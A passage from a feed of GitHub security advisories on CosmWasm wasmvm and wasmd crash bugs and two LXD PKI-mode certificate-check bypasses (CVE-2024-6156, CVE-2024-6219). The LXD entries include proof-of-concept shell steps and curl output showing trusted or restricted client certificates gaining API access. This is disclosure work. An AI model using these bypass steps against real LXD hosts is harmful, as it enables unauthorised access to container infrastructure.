            "content_html": "<h1 id=\"cwa-2024-008\">CWA-2024-008</h1>\n<p><strong>Severity</strong></p>\n<p>Medium (Moderate + Likely)[^1]</p>\n<p><strong>Affected versions:</strong></p>\n<ul>\n<li>wasmvm &gt;= 2.1.0, &lt; 2.1.3</li>\n<li>wasmvm &gt;= 2.0.0, &lt; 2.0.4</li>\n<li>wasmvm &lt; 1.5.5</li>\n<li>cosmwasm-vm &gt;= 2.1.0, &lt; 2.1.4</li>\n<li>cosmwasm-vm &gt;= 2.0.0, &lt; 2.0.7</li>\n<li>cosmwasm-vm &lt; 1.5.8</li>\n</ul>\n<p><strong>Patched versions:</strong></p>\n<ul>\n<li>wasmvm 1.5.5, 2.0.4, 2.1.3</li>\n<li>cosmwasm-vm 1.5.8, 2.0.7, 2.1.4</li>\n</ul>\n<h2 id=\"description-of-the-bug\">Description of the bug</h2>\n<p>(Blank for now. We'll add more detail once chains had a chance to upgrade.)</p>\n<h2 id=\"patch\">Patch</h2>\n<ul>\n<li>1.5: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/edcdbc520d4f5521eed42de6e2869658278e91fd\">https://github.com/CosmWasm/cosmwasm/commit/edcdbc520d4f5521eed42de6e2869658278e91fd</a></li>\n<li>2.0: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/f63429ca59eb44dd5d780c1572016581337091e4\">https://github.com/CosmWasm/cosmwasm/commit/f63429ca59eb44dd5d780c1572016581337091e4</a></li>\n<li>2.1: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/108e7dcbf9c21df0fa83f355ad3a7355d7f220cb\">https://github.com/CosmWasm/cosmwasm/commit/108e7dcbf9c21df0fa83f355ad3a7355d7f220cb</a></li>\n</ul>\n<h2 id=\"applying-the-patch\">Applying the patch</h2>\n<p>The patch will be shipped in releases of wasmvm. You can update more or less as follows:</p>\n<ol>\n<li>Check the current wasmvm version: <code>go list -m github.com/CosmWasm/wasmvm</code></li>\n<li>Bump the <code>github.com/CosmWasm/wasmvm</code> dependency in your go.mod to 1.5.5, 2.0.4, 2.1.3 depending on which minor version you are; <code>go mod tidy</code>; commit.</li>\n<li>If you use the static libraries <code>libwasmvm_muslc.aarch64.a</code>/<code>libwasmvm_muslc.x86_64.a</code>, update them accordingly.</li>\n<li>Check the updated wasmvm version: <code>go list -m github.com/CosmWasm/wasmvm</code> and ensure you see 1.5.5, 2.0.4, 2.1.3.</li>\n<li>Follow your regular practices to deploy chain upgrades.</li>\n</ol>\n<p>To double check if the correct library version is loaded at runtime, use this query:\n<code>&lt;appd&gt; query wasm libwasmvm-version</code>. It must show 1.5.5, 2.0.4 or 2.1.3.</p>\n<p>The patch is consensus breaking and requires a coordinated upgrade.</p>\n<h2 id=\"acknowledgement\">Acknowledgement</h2>\n<p>This issue was found by meadow101 who reported it to the Cosmos Bug Bounty Program on HackerOne.</p>\n<p>If you believe you have found a bug in the Interchain Stack or would like to contribute to the\nprogram by reporting a bug, please see <a href=\"https://hackerone.com/cosmos\">https://hackerone.com/cosmos</a>.</p>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li>2024-08-22: Confio receives a report through the Cosmos bug bounty program maintained by Amulet.</li>\n<li>2024-08-23: Confio security contributors confirm the report.</li>\n<li>2024-09-09: Confio developed the patch internally.</li>\n<li>2024-09-23: Patch is released.</li>\n</ul>\n<p>[^1]: following Amulet's Severity Classification Framework ACMv1: <a href=\"https://github.com/interchainio/security/blob/e0227a1fb4059144aab4f6003eeee7f09912db3a/resources/CLASSIFICATION_MATRIX.md\">https://github.com/interchainio/security/blob/e0227a1fb4059144aab4f6003eeee7f09912db3a/resources/CLASSIFICATION_MATRIX.md</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-vmqh-5232-v43r\">https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-vmqh-5232-v43r</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/108e7dcbf9c21df0fa83f355ad3a7355d7f220cb\">https://github.com/CosmWasm/cosmwasm/commit/108e7dcbf9c21df0fa83f355ad3a7355d7f220cb</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/edcdbc520d4f5521eed42de6e2869658278e91fd\">https://github.com/CosmWasm/cosmwasm/commit/edcdbc520d4f5521eed42de6e2869658278e91fd</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/f63429ca59eb44dd5d780c1572016581337091e4\">https://github.com/CosmWasm/cosmwasm/commit/f63429ca59eb44dd5d780c1572016581337091e4</a></li>\n<li><a href=\"https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-008.md\">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-008.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vmqh-5232-v43r\">https://github.com/advisories/GHSA-vmqh-5232-v43r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vmqh-5232-v43r",
            "title": "[github.com/CosmWasm/wasmvm/v2] Panic in wasmvm can slow down block production",
            "date_modified": "2024-12-10T16:55:38.000Z",
            "date_published": "2024-12-10T16:55:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vmqh-5232-v43r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"cwa-2024-008\">CWA-2024-008</h1>\n<p><strong>Severity</strong></p>\n<p>Medium (Moderate + Likely)[^1]</p>\n<p><strong>Affected versions:</strong></p>\n<ul>\n<li>wasmvm &gt;= 2.1.0, &lt; 2.1.3</li>\n<li>wasmvm &gt;= 2.0.0, &lt; 2.0.4</li>\n<li>wasmvm &lt; 1.5.5</li>\n<li>cosmwasm-vm &gt;= 2.1.0, &lt; 2.1.4</li>\n<li>cosmwasm-vm &gt;= 2.0.0, &lt; 2.0.7</li>\n<li>cosmwasm-vm &lt; 1.5.8</li>\n</ul>\n<p><strong>Patched versions:</strong></p>\n<ul>\n<li>wasmvm 1.5.5, 2.0.4, 2.1.3</li>\n<li>cosmwasm-vm 1.5.8, 2.0.7, 2.1.4</li>\n</ul>\n<h2 id=\"description-of-the-bug\">Description of the bug</h2>\n<p>(Blank for now. We'll add more detail once chains had a chance to upgrade.)</p>\n<h2 id=\"patch\">Patch</h2>\n<ul>\n<li>1.5: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/edcdbc520d4f5521eed42de6e2869658278e91fd\">https://github.com/CosmWasm/cosmwasm/commit/edcdbc520d4f5521eed42de6e2869658278e91fd</a></li>\n<li>2.0: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/f63429ca59eb44dd5d780c1572016581337091e4\">https://github.com/CosmWasm/cosmwasm/commit/f63429ca59eb44dd5d780c1572016581337091e4</a></li>\n<li>2.1: <a href=\"https://github.com/CosmWasm/cosmwasm/commit/108e7dcbf9c21df0fa83f355ad3a7355d7f220cb\">https://github.com/CosmWasm/cosmwasm/commit/108e7dcbf9c21df0fa83f355ad3a7355d7f220cb</a></li>\n</ul>\n<h2 id=\"applying-the-patch\">Applying the patch</h2>\n<p>The patch will be shipped in releases of wasmvm. You can update more or less as follows:</p>\n<ol>\n<li>Check the current wasmvm version: <code>go list -m github.com/CosmWasm/wasmvm</code></li>\n<li>Bump the <code>github.com/CosmWasm/wasmvm</code> dependency in your go.mod to 1.5.5, 2.0.4, 2.1.3 depending on which minor version you are; <code>go mod tidy</code>; commit.</li>\n<li>If you use the static libraries <code>libwasmvm_muslc.aarch64.a</code>/<code>libwasmvm_muslc.x86_64.a</code>, update them accordingly.</li>\n<li>Check the updated wasmvm version: <code>go list -m github.com/CosmWasm/wasmvm</code> and ensure you see 1.5.5, 2.0.4, 2.1.3.</li>\n<li>Follow your regular practices to deploy chain upgrades.</li>\n</ol>\n<p>To double check if the correct library version is loaded at runtime, use this query:\n<code>&lt;appd&gt; query wasm libwasmvm-version</code>. It must show 1.5.5, 2.0.4 or 2.1.3.</p>\n<p>The patch is consensus breaking and requires a coordinated upgrade.</p>\n<h2 id=\"acknowledgement\">Acknowledgement</h2>\n<p>This issue was found by meadow101 who reported it to the Cosmos Bug Bounty Program on HackerOne.</p>\n<p>If you believe you have found a bug in the Interchain Stack or would like to contribute to the\nprogram by reporting a bug, please see <a href=\"https://hackerone.com/cosmos\">https://hackerone.com/cosmos</a>.</p>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li>2024-08-22: Confio receives a report through the Cosmos bug bounty program maintained by Amulet.</li>\n<li>2024-08-23: Confio security contributors confirm the report.</li>\n<li>2024-09-09: Confio developed the patch internally.</li>\n<li>2024-09-23: Patch is released.</li>\n</ul>\n<p>[^1]: following Amulet's Severity Classification Framework ACMv1: <a href=\"https://github.com/interchainio/security/blob/e0227a1fb4059144aab4f6003eeee7f09912db3a/resources/CLASSIFICATION_MATRIX.md\">https://github.com/interchainio/security/blob/e0227a1fb4059144aab4f6003eeee7f09912db3a/resources/CLASSIFICATION_MATRIX.md</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-vmqh-5232-v43r\">https://github.com/CosmWasm/wasmvm/security/advisories/GHSA-vmqh-5232-v43r</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/108e7dcbf9c21df0fa83f355ad3a7355d7f220cb\">https://github.com/CosmWasm/cosmwasm/commit/108e7dcbf9c21df0fa83f355ad3a7355d7f220cb</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/edcdbc520d4f5521eed42de6e2869658278e91fd\">https://github.com/CosmWasm/cosmwasm/commit/edcdbc520d4f5521eed42de6e2869658278e91fd</a></li>\n<li><a href=\"https://github.com/CosmWasm/cosmwasm/commit/f63429ca59eb44dd5d780c1572016581337091e4\">https://github.com/CosmWasm/cosmwasm/commit/f63429ca59eb44dd5d780c1572016581337091e4</a></li>\n<li><a href=\"https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-008.md\">https://github.com/CosmWasm/advisories/blob/main/CWAs/CWA-2024-008.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vmqh-5232-v43r\">https://github.com/advisories/GHSA-vmqh-5232-v43r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vmqh-5232-v43r",
            "title": "[github.com/CosmWasm/wasmvm/v2] Panic in wasmvm can slow down block production",
            "date_modified": "2024-12-10T16:55:38.000Z",
            "date_published": "2024-12-10T16:55:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vmqh-5232-v43r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"cwa-2024-009\">CWA-2024-009</h1>\n<p><strong>Severity</strong></p>\n<p>Low (Marginal + Likely)[^1]</p>\n<p><strong>Affected versions:</strong></p>\n<ul>\n<li>wasmd &lt; 0.53.1</li>\n</ul>\n<p><strong>Patched versions:</strong></p>\n<ul>\n<li>wasmd 0.53.2 (please note that wasmd 0.53.1 is broken and must not be used)</li>\n</ul>\n<h2 id=\"description-of-the-bug\">Description of the bug</h2>\n<p>(Blank for now. We'll add more detail once chains had a chance to upgrade.)</p>\n<h2 id=\"mitigations\">Mitigations</h2>\n<p>Apart from upgrading, it is recommended to <strong>not</strong> open the gRPC and REST APIs of <em>validator</em> nodes to the public internet. Use isolated and resource-constrained environments for running separate public RPC nodes instead.\nThese can then easily be thrown away and replaced with new instances in case of problems.</p>\n<h2 id=\"applying-the-patch\">Applying the patch</h2>\n<h3 id=\"official-wasmd-patch\">Official Wasmd patch</h3>\n<p>The patch will be shipped in a wasmd release. You will also have to update <code>libwasmvm</code> if you build statically.\nIf you already use the latest / close to latest wasmd, you can update more or less as follows:</p>\n<ol>\n<li>Check the current wasmd version: <code>go list -m github.com/CosmWasm/wasmd</code></li>\n<li>Bump the <code>github.com/CosmWasm/wasmd</code> dependency in your go.mod to 0.53.2 (Cosmos SDK 0.50 compatible); <code>go mod tidy</code>; commit.</li>\n<li>If you use the static libraries <code>libwasmvm_muslc.aarch64.a</code>/<code>libwasmvm_muslc.x86_64.a</code>, make sure that you use the same version as your wasmvm version.</li>\n<li>Check the updated wasmd version: <code>go list -m github.com/CosmWasm/wasmd</code> and ensure you see 0.53.2.</li>\n<li>Follow your regular practices to deploy chain upgrades.</li>\n</ol>\n<p>To double check if the correct library version is loaded at runtime, use this query:\n<code>&lt;appd&gt; query wasm libwasmvm-version</code>. It must show 2.1.4.</p>\n<p>The patch is not consensus breaking <em>if you are already using wasmvm 2.1.3</em>.\nIf you are instead using wasmvm 2.1.2, then upgrading to 2.1.4 includes the consensus breaking changes of 2.1.3.</p>\n<h3 id=\"diy-patch\">DIY Patch</h3>\n<p>If you are unable to upgrade to the latest version, you can backport the wasmd patch to your version. The patch is available at <a href=\"https://github.com/CosmWasm/wasmd/compare/v0.53.0...v0.53.2\">Wasmd 0.53.2</a>.\nHowever, if you are on an older version of wasmd, you will also be using a different version of wasmvm. We provide the required patches for wasmvm in versions 2.1.4, 2.0.5, 1.5.6.\nTo upgrade using this method:</p>\n<ol>\n<li>Check the current wasmvm version: <code>go list -m github.com/CosmWasm/wasmvm</code> and upgrade\nto the closest patched version.</li>\n<li>Bump the github.com/CosmWasm/wasmvm dependency in your go.mod to the closest compatible patched version (either 2.1.4, 2.0.5 or 1.5.6); go mod tidy; commit.</li>\n<li>Apply the patch linked above to your version of wasmd.</li>\n<li>If you use the static libraries <code>libwasmvm_muslc.aarch64.a</code>/<code>libwasmvm_muslc.x86_64.a</code>, make sure that you use the same version as your wasmvm version.</li>\n<li>Follow your regular practices to deploy chain upgrades.</li>\n</ol>\n<p>To double check if the correct library version is loaded at runtime, use this query:\n<code>&lt;appd&gt; query wasm libwasmvm-version</code>. It must show 2.1.4, 2.0.5 or 1.5.6 and must be the same as the wasmvm version in your go.sum.</p>\n<p>The patch is not consensus breaking as long as you were using the previous patch version of wasmvm before.</p>\n<h2 id=\"acknowledgement\">Acknowledgement</h2>\n<p>This issue was found by meadow101 who reported it to the Cosmos Bug Bounty Program on HackerOne.</p>\n<p>If you believe you have found a bug in the Interchain Stack or would like to contribute to the\nprogram by reporting a bug, please see <a href=\"https://hackerone.com/cosmos\">https://hackerone.com/cosmos</a>.</p>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li>2024-09-25: Confio receives a report through the Cosmos bug bounty program maintained by Amulet.</li>\n<li>2024-09-30: Confio security contributors confirm the report.</li>\n<li>2024-11-21: Confio developed the patch internally.</li>\n<li>2024-12-06: Patch release is pre-announced through notification lists.</li>\n<li>2024-12-10: Patch released.</li>\n</ul>\n<p>[^1]: following Amulet's Severity Classification Framework ACMv1: <a href=\"https://github.com/interchainio/security/blob/e0227a1fb4059144aab4f6003eeee7f09912db3a/resources/CLASSIFICATION_MATRIX.md\">https://github.com/interchainio/security/blob/e0227a1fb4059144aab4f6003eeee7f09912db3a/resources/CLASSIFICATION_MATRIX.md</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/CosmWasm/wasmd/security/advisories/GHSA-vmg2-r3xv-r3xf\">https://github.com/CosmWasm/wasmd/security/advisories/GHSA-vmg2-r3xv-r3xf</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vmg2-r3xv-r3xf\">https://github.com/advisories/GHSA-vmg2-r3xv-r3xf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vmg2-r3xv-r3xf",
            "title": "[github.com/CosmWasm/wasmd] Simulation of Wasmd message can cause crashing",
            "date_modified": "2024-12-10T16:55:36.000Z",
            "date_published": "2024-12-10T16:55:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vmg2-r3xv-r3xf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>If a <code>server.ca</code> file is present in <code>LXD_DIR</code> at LXD start up, LXD is in \"PKI mode\". In this mode, only TLS clients that have a CA-signed certificate should be able to authenticate with LXD.</p>\n<p>We have discovered that if a client that sends a non-CA signed certificate during the TLS handshake, that client is able to authenticate with LXD if their certificate is present in the trust store.\n    - The LXD Go client (and by extension <code>lxc</code>) does not send non-CA signed certificates during the handshake.\n    - A manual client (e.g. <code>cURL</code>) might send a non-CA signed certificate during the handshake.</p>\n<h4 id=\"versions-affected\">Versions affected</h4>\n<p>LXD 4.0 and above.</p>\n<h3 id=\"details\">Details</h3>\n<p>When PKI mode was added to LXD it was intended that all client and server certificates <em>must</em> be signed by the certificate authority (see <a href=\"https://github.com/canonical/lxd/pull/2070/commits/84d917bdcca6fe1e3191ce47f1597c7d094e1909\">https://github.com/canonical/lxd/pull/2070/commits/84d917bdcca6fe1e3191ce47f1597c7d094e1909</a>). </p>\n<p>In PKI mode, the TLS listener configuration is altered to add the CA certificate but the <code>ClientAuth</code> field of <code>tls.Config</code> is not changed. The <code>ClientAuth</code> field is set to <code>tls.RequestClientCert</code>, which configures the TLS connection to request a certificate from the client, but not require one. This is necessary because untrusted requests are allowed for some endpoints.</p>\n<p>If a client certificate is present in the trust store before PKI mode is enabled, calls to LXD using that certificate fail <em>when using the Go client for LXD</em>. I believe that what is happening is as follows:</p>\n<ul>\n<li>During the TLS handshake, the server requests a certificate from the client. The server includes in it's request a list of acceptable CAs.</li>\n<li>The go client receives the request from the server, but does not have any certificates that match what the server requires, and so does not send any.</li>\n<li>The server considers the handshake complete because it does not absolutely require the client certificate (see above).</li>\n<li>In the <code>(*Daemon).Authenticate</code> method, when checking for TLS clients, there are no <code>PeerCertificates</code> in the request. So <code>util.CheckTrustState</code> is never called and the request is denied.</li>\n</ul>\n<p>Importantly, the above does not apply if the client sends a certificate during the handshake anyway. If this occurs and the certificate is present in the trust store, the request is trusted and is allowed to continue. It is possible to do this using cURL*.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>The follow snippet demonstrates the vulnerability:</p>\n<pre><code># Install/initialize LXD\n$ snap install lxd --channel 5.21/stable\n$ lxd init --auto\n$ lxc config set core.https_address=127.0.0.1:8443\n\n# Add a certificate to the trust store before enabling PKI.\n$ token=\"$(lxc config trust add --name ca-test --quiet)\"\n$ lxc remote add tls \"${token}\"\n\n# Use easyrsa for configuring CA: https://github.com/OpenVPN/easy-rsa\n$ cp -R /usr/share/easy-rsa \"/tmp/pki\"\n$ export EASYRSA_KEY_SIZE=4096\n$ cd /tmp/pki\n$ ./easyrsa init-pki\n$ echo \"lxd\" | ./easyrsa build-ca nopass\n$ cp pki/ca.crt /var/snap/lxd/common/lxd/server.ca\n\n# Restart daemon.\n$ systemctl reload snap.lxd.daemon\n\n# Using curl with the client certificate we expect a 403 Forbidden response.\n# Instead we get a 200 OK and we are able to view the response body.\n$ cat ~/snap/lxd/common/config/client.crt ~/snap/lxd/common/config/client.key &gt; ~/snap/lxd/common/config/client.pem\n$ curl -s --cert ~/snap/lxd/common/config/client.pem --cacert /var/snap/lxd/common/lxd/server.crt https://127.0.0.1:8443/1.0\" | jq '.metadata.config.\"core.https_address\"'\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>I believe this has a low impact for the following reasons:</p>\n<ul>\n<li>PKI mode is unlikely to have a large user base.</li>\n<li>PKI is likely to be configured at start up without any previous certificates in the trust store.</li>\n<li>Authentication is not bypassed entirely, the client certificate must already be trusted.</li>\n</ul>\n<h3 id=\"notes\">Notes</h3>\n<ul>\n<li>I am not certain why cURL sends the certificate during the handshake but we can see it in the logs:</li>\n</ul>\n<pre><code>*   Trying 127.0.0.1:8443...\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 127.0.0.1 (127.0.0.1) port 8443 (#0)\n* ALPN, offering h2\n* ALPN, offering http/1.1\n*  CAfile: /var/lib/lxd/server.crt\n*  CApath: /etc/ssl/certs\n* TLSv1.0 (OUT), TLS header, Certificate Status (22):\n} [5 bytes data]\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\n} [512 bytes data]\n  0     0    0     0    0     0      0      0 --:--:--  0:00:03 --:--:--     0* TLSv1.2 (IN), TLS header, Certificate Status (22):\n{ [5 bytes data]\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\n{ [122 bytes data]\n* TLSv1.2 (IN), TLS header, Finished (20):\n{ [5 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):\n{ [15 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.3 (IN), TLS handshake, Request CERT (13):\n{ [69 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.3 (IN), TLS handshake, Certificate (11):\n{ [496 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.3 (IN), TLS handshake, CERT verify (15):\n{ [111 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.3 (IN), TLS handshake, Finished (20):\n{ [36 bytes data]\n* TLSv1.2 (OUT), TLS header, Finished (20):\n} [5 bytes data]\n* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):\n} [1 bytes data]\n* TLSv1.2 (OUT), TLS header, Supplemental data (23):\n} [5 bytes data]\n* TLSv1.3 (OUT), TLS handshake, Certificate (11):         &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; HERE\n} [455 bytes data]\n* TLSv1.2 (OUT), TLS header, Supplemental data (23):\n} [5 bytes data]\n* TLSv1.3 (OUT), TLS handshake, CERT verify (15):\n} [111 bytes data]\n* TLSv1.2 (OUT), TLS header, Supplemental data (23):\n} [5 bytes data]\n* TLSv1.3 (OUT), TLS handshake, Finished (20):\n} [36 bytes data]\n* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256\n* ALPN, server accepted to use h2\n* Server certificate:\n*  subject: O=LXD; CN=root@RUBIX\n*  start date: Apr  2 15:27:39 2024 GMT\n*  expire date: Mar 31 15:27:39 2034 GMT\n*  subjectAltName: host \"127.0.0.1\" matched cert's IP address!\n*  issuer: O=LXD; CN=root@RUBIX\n*  SSL certificate verify ok.\n* Using HTTP2, server supports multiplexing\n* Connection state changed (HTTP/2 confirmed)\n* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0\n* TLSv1.2 (OUT), TLS header, Supplemental data (23):\n} [5 bytes data]\n* TLSv1.2 (OUT), TLS header, Supplemental data (23):\n} [5 bytes data]\n* TLSv1.2 (OUT), TLS header, Supplemental data (23):\n} [5 bytes data]\n* Using Stream ID: 1 (easy handle 0x601ce9c4feb0)\n* TLSv1.2 (OUT), TLS header, Supplemental data (23):\n} [5 bytes data]\n&gt; GET /1.0 HTTP/2\n&gt; Host: 127.0.0.1:8443\n&gt; user-agent: curl/7.81.0\n&gt; accept: */*\n&gt; \n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\n{ [569 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* Connection state changed (MAX_CONCURRENT_STREAMS == 250)!\n* TLSv1.2 (OUT), TLS header, Supplemental data (23):\n} [5 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n&lt; HTTP/2 200 \n&lt; content-type: application/json\n&lt; etag: \"a1147bd1cd26e0b98e4c4400be3c17d5de3d865a045b6e609c6a8ee1aba8c1a1\"\n&lt; date: Mon, 17 Jun 2024 21:25:46 GMT\n&lt; \n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n100 11659    0 11659    0     0   3401      0 --:--:--  0:00:03 --:--:--  3402\n* Connection #0 to host 127.0.0.1 left intact\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/canonical/lxd/security/advisories/GHSA-4c49-9fpc-hc3v\">https://github.com/canonical/lxd/security/advisories/GHSA-4c49-9fpc-hc3v</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-6156\">https://nvd.nist.gov/vuln/detail/CVE-2024-6156</a></li>\n<li><a href=\"https://github.com/canonical/lxd/commit/92468bb60f4f1edf38ff0434414bea4f28afa711\">https://github.com/canonical/lxd/commit/92468bb60f4f1edf38ff0434414bea4f28afa711</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2024-6156\">https://www.cve.org/CVERecord?id=CVE-2024-6156</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2024-3312\">https://pkg.go.dev/vuln/GO-2024-3312</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4c49-9fpc-hc3v\">https://github.com/advisories/GHSA-4c49-9fpc-hc3v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4c49-9fpc-hc3v",
            "title": "[github.com/canonical/lxd] lxd CA certificate sign check bypass",
            "date_modified": "2024-12-11T21:16:18.000Z",
            "date_published": "2024-12-09T23:26:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4c49-9fpc-hc3v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>If a <code>server.ca</code> file is present in <code>LXD_DIR</code> at LXD start up, LXD is in \"PKI mode\". In this mode, all clients must have certificates that have been signed by the CA. </p>\n<p>The LXD configuration option <code>core.trust_ca_certificates</code> defaults to <code>false</code>. This means that although the client certificate has been signed by the CA, LXD will additionally add the certificate to the trust store and verify it via mTLS.</p>\n<p>When a restricted certificate is added to the trust store in this mode, it's restrictions are not honoured, and the client has full access to LXD.</p>\n<h3 id=\"details\">Details</h3>\n<p>When authorization was refactored to allow for generalisation (at the time for TLS, RBAC, and OpenFGA, see <a href=\"https://github.com/canonical/lxd/pull/12313\">https://github.com/canonical/lxd/pull/12313</a>), PKI mode did not account for the <code>core.trust_ca_certificates</code> configuration option. When this option is enabled, all CA-signed client certificates are given full access to LXD. <a href=\"https://github.com/canonical/lxd/pull/12513/commits/5cdc9a35b9c51e981b1e70330bde0413ccacc7fd\">This cherry-pick from Incus</a> was added to LXD to fix the issue. </p>\n<p>The cherry-pick fixed the immediate issue and allowed full access to LXD for CA-signed client certificates when <code>core.trust_ca_certificates</code> is enabled, but did not consider the behaviour of LXD when <code>core.trust_ca_certificates</code> is disabled. </p>\n<p>When <code>core.trust_ca_certificates</code> is false, restrictions that are applied to a certificate should be honoured. Instead, they are being ignored due to the presence of a <code>server.ca</code> file in <code>LXD_DIR</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code># Install/initialize LXD\n$ snap install lxd --channel 5.21/stable\n$ lxd init --auto\n$ lxc config set core.https_address=127.0.0.1:8443\n\n# Use easyrsa for configuring CA: https://github.com/OpenVPN/easy-rsa\n$ cp -R /usr/share/easy-rsa \"/tmp/pki\"\n$ export EASYRSA_KEY_SIZE=4096\n$ cd /tmp/pki\n$ ./easyrsa init-pki\n$ echo \"lxd\" | ./easyrsa build-ca nopass\n$ ./easyrsa build-client-full lxd-client nopass\n$ cp pki/ca.crt /var/snap/lxd/common/lxd/server.ca\n$ cp pki/issued/lxd-client.crt ~/snap/lxd/common/config/client.crt\n$ cp pki/private/lxd-client.key ~/snap/lxd/common/config/client.key\n\n# Restart daemon.\n$ systemctl reload snap.lxd.daemon\n\n# Add a restricted certificate to the trust store.\n$ token=\"$(lxc config trust add --name ca-test --quiet --restricted)\"\n$ lxc remote add tls \"${token}\"\n\n# Our client has a CA-signed certificate, but it is restricted, so the client should not be able to view server config.\n$ lxc config get tls: core.https_address\n127.0.0.1:8443\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>I believe this vulnerability is low impact because PKI mode is:</p>\n<ol>\n<li>Not the standard or recommended mode of operation for LXD.</li>\n<li>While <code>core.trust_ca_certificates</code> defaults to false, we believe that users who enable PKI mode will generally have <code>core.trust_ca_certificates</code> enabled to allow for passwordless PKI with CRL revocation (see <a href=\"https://github.com/canonical/lxd/issues/3832\">https://github.com/canonical/lxd/issues/3832</a>). When this mode is enabled, all clients with CA-signed certificates have root access* anyway.</li>\n</ol>\n<p>*Note: If a restricted certificate is added before <code>core.trust_ca_certificates</code> is enabled, the certificate becomes unrestricted. We believe this was the original intention of the PR, but this should be changed to disallow any unintended permission change.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/canonical/lxd/security/advisories/GHSA-jpmc-7p9c-4rxf\">https://github.com/canonical/lxd/security/advisories/GHSA-jpmc-7p9c-4rxf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-6219\">https://nvd.nist.gov/vuln/detail/CVE-2024-6219</a></li>\n<li><a href=\"https://github.com/canonical/lxd/pull/12313\">https://github.com/canonical/lxd/pull/12313</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2024-3313\">https://pkg.go.dev/vuln/GO-2024-3313</a></li>\n<li><a 